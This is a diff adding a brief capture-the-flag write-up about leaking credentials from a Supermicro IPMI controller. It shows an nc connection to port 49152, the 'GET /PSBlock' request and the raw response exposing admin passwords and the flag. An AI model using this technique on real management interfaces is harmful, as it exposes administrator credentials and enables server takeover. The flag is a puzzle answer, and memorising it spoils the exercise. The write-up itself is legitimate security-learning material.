@@ -1,0 +1,14 @@
+Looking up Supermicro ipmi server vulnerabilities, we find the following link: http://serverfault.com/questions/606877/how-to-check-if-my-supermicro-ipmi-is-compromised-with-plaintext-admin-password
+
+Apparently, we can connect to port 49152 and run a specific GET request to leak credentials.
+
+$ nc prod_atl_dc3_r49_u23.rogueterminal.com 49152
+ATEN SMASH-CLP System Management Shell, version 1.02
+Copyright (c) 2008-2009 by ATEN International CO., Ltd.
+All Rights Reserved
+
+GET /PSBlock
+=%}?
+0adminADMIN**ADMIN**;TTroot**flag{1PM1_1S_MUY_1N$3CUR3_LOPL}**???%?v?i?o???DDD@??
+
+flag{1PM1_1S_MUY_1N$3CUR3_LOPL}
